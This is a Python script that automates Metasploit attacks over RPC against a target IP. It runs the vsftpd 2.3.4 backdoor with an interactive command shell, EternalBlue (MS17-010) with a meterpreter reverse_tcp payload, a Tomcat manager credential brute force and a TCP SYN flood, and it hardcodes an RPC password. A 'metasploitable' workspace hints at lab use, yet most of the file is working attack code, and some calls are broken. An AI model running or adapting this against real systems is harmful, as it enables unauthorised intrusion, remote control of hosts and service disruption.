# first run msfconsole on linux, then enter cmd > load msgrpc

from pymetasploit3.msfrpc import MsfRpcClient
from pymetasploit3.msfconsole import MsfRpcConsole
import time
import tkinter as tk
from tkinter import simpledialog

global console
global client
global global_positive_out
global_positive_out = list()
global global_console_status
global_console_status = False
client = MsfRpcClient('abc123', port=55552, ssl=False)

def read_console(console_data):
    global global_console_status
    global_console_status = console_data['busy']
    #print(global_console_status)

    if '[+]' in console_data['data']:
        sigdata = console_data['data'].rstrip().split('\n')
        #print("in sigdata", sigdata)
        for line in sigdata:
            if '[+]' in line:
                print(line)
                global_positive_out.append(line)
        #print(console_data['data'])


def vsftpd_exploit(uexploit, tgt_ip):
    # use exploit
    global client
    exploit = client.modules.use('exploit', uexploit)
    # set RHOSTS
    exploit['RHOSTS'] = tgt_ip  # IP of tgt host
    # select payload
    exploit.targetpayloads()
    ['cmd/unix/interact']
    # only one payload
    exploit.execute(payload='cmd/unix/interact')
    time.sleep(5)
    for i in range(5):
        client.sessions.list
        #list = list(client.sessions.list)[-1]


    # interacting with shell
    shell = client.sessions.session('1')
    cmd = get_comd()
    shell.write(cmd)
    print("\n\n\n\n\n\n\n\n")
    print("[*] Reverse Shell of Target : \n\n[*] Running comd ",cmd)
    print(shell.read())


def dos_exploit(tgt_ip):
    dosexploit = 'auxiliary/dos/tcp/synflood'
    global client
    print(tgt_ip)

    exploit = client.modules.use('auxiliary', dosexploit)

    print(exploit.description)

    exploit['RHOSTS'] = tgt_ip  # IP of tgt host

    exploit.execute()


def get_comd():
    ROOT = tk.Tk()
    ROOT.withdraw()
    # the input dialog
    USER_INP = simpledialog.askstring(title="Reverse Shell",
                                      prompt="Enter comd: ")

    # check it out
    #print("Hello", USER_INP)
    return USER_INP

def apachetomcat11_exploit(apache_exploit, tgt_ip):
    # use exploit
    global console
    global client
    # exploit = client.modules.use('auxiliary', apache_exploit)
    # print(exploit.description)
    print("getting console")
    console = MsfRpcConsole(client, cb=read_console)

    console.execute('use ' + apache_exploit)
    time.sleep(5)
    console.execute('workspace metasploitable')
    time.sleep(3)
    console.execute('set BLANK_PASSWORDS True')
    time.sleep(3)
    console.execute('set RHOSTS ' + tgt_ip)
    time.sleep(3)
    console.execute('set RPORT 8180')
    time.sleep(3)
    console.execute('set USER_AS_PASS True')
    time.sleep(3)
    print("setting options")
    # set RHOSTS
    '''
    exploit['BLANK_PASSWORDS'] = True
    exploit['RHOSTS'] = tgt_ip  # IP of tgt host
    exploit['USER_AS_PASS'] = True
    exploit['RPORT'] = 8180
    '''

    print("running exploit")
    # console_id = client.consoles.console().cid
    # console = client.consoles.console(console_id)
    console.execute('exploit')
    # exploit.execute()


def exploit_eb(tgt_ip):
    # use exploit
    '''
    exploit = client.modules.use('auxiliary', 'auxiliary/scanner/smb/smb_ms17_010')
    exploit['RHOSTS'] = tgt_ip  # IP of tgt host
    exploit.execute()
    '''

    global client
    global console
    global global_console_status
    global global_positive_out
    #exploit1 = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
    console = MsfRpcConsole(client, cb=read_console)

    console.execute('use exploit/windows/smb/ms17_010_eternalblue')
    time.sleep(3)
    console.execute('set RHOSTS ' + tgt_ip)
    time.sleep(3)
    console.execute('exploit')
    time.sleep(25)
    #print(sess)
    '''
    while global_console_status:
        print('global_console_status: ' + str(global_console_status))
        time.sleep(5)
        '''

    #console.execute('ipconfig')


    l='1'
    for i in range(3):
        time.sleep(7)
        if len(client.sessions.list)>=1:
            l = str(list(client.sessions.list)[-1])
            print(l)

    met_shell = client.sessions.session(l)

    time.sleep(10)
    met_shell.run_with_output('getuid')
    print(met_shell.read())

def exploit_eb1(tgt_ip):
    # use exploit

    global client
    global console
    exploit1 = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
    print(exploit1.description)
    exploit1['RHOSTS'] = tgt_ip  # IP of tgt host
    payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
    #exploit1.targetpayloads()
    exploit1.execute(payload=payload)
    #['payload/windows/x64/meterpreter/reverse_tcp']
    time.sleep(20)
    for i in range(5):
        time.sleep(5)
        print(client.sessions.list)
        if len(client.sessions.list)>=1:
            l = str(list(client.sessions.list)[-1])
            print(l)
            if i==4:
                met_shell = client.sessions.session(l)
                time.sleep(10)

    met_shell = client.sessions.session(l)

    met_shell.run_with_output('ipconfig')
    print(met_shell.read())



def exploit(host,exploit):
    # Connecting Client to msfrpcd
      # change password o after load msgrpc
    global client
    # USER INPUT
    '''
    uexploit = 'unix/ftp/vsftpd_234_backdoor'
    cmd = 'ifconfig'
    tgt_ip = '10.0.2.6'
    print(tgt_ip)

    print()
    '''
    uexploit = exploit[1]

    tgt_ip = host['IP']
    tgt_port = host['Port']
    print("Inside Exploit :",uexploit, tgt_ip)
    if 'auxiliary/dos/tcp/synflood' in uexploit:
        dos_exploit(dosexploit, tgt_ip)
    elif 'unix/ftp/vsftpd_234_backdoor' in uexploit:
        vsftpd_exploit(uexploit, tgt_ip)
    elif 'scanner/http/tomcat_mgr_login' in uexploit:
        apachetomcat11_exploit(uexploit, tgt_ip)
    elif 'dos/tcp/synflood' in uexploit:
        dos_exploit(client, tgt_ip)
    elif 'windows/smb' in uexploit:
        exploit_eb(tgt_ip)



    # dos_exploit(dosexploit, tgt_ip)

        '''
        shell = client.sessions.session('1')
        cmd = get_comd()
        shell.write(cmd)
        print("\n\n\n\n\n\n\n\n")
        print("[*] Reverse Shell of Target : \n\n[*] Running comd ",cmd)
        print(shell.read())

        global console
        print("getting console")
        console = MsfRpcConsole(client, cb=read_console)
        eternalblue_aux = 'auxiliary/scanner/smb/smb_ms17_010'
        eternalblue_exploit = 'exploit/windows/smb/ms17_010_eternalblue'
        print("scanning tgt for eternalblue vulnerability")
        console.execute('use '+eternalblue_aux)
        console.execute('set RHOSTS ' + tgt_ip)
        console.execute('run')
        print("aux executed")
        console.execute('use '+eternalblue_exploit)
        console.execute('set RHOSTS ' + tgt_ip)

        console.execute('exploit')
        time.sleep(5)
        print("exploit completed")
        for i in range(5):
            client.sessions.list

        # interacting with shell
        '''
         #shell = client.sessions.session('1')
        #shell.write('ipconfig')
        #print(shell.read())
        #console.execute(console)
        '''
        #SessionList = client.sessions.
        #print(SessionList)
        #print(client.sessions.list)
        met_shell = client.sessions.session('2')
        time.sleep(10)
        met_shell.session.shell_write('ipconfig')
        print(met_shell.read())


            print(exploit1.description)
            exploit1['RHOSTS'] = tgt_ip  # IP of tgt host
            exploit1.execute()
            for i in range(5):
                time.sleep(5)
                print(client.sessions.list)
                if len(client.sessions.list)>=1:
                    l = str(list(client.sessions.list)[-1])
                    print(l)
                    if i==4:
                        met_shell = client.sessions.session(l)
                        time.sleep(10)

            #met_shell.run_shell_cmd_with_output('ipconfig')
            #met_shell.meterpreter_write('pwd')
            met_shell.session.shell_write('ipconfig')
            print(met_shell.read())

        '''
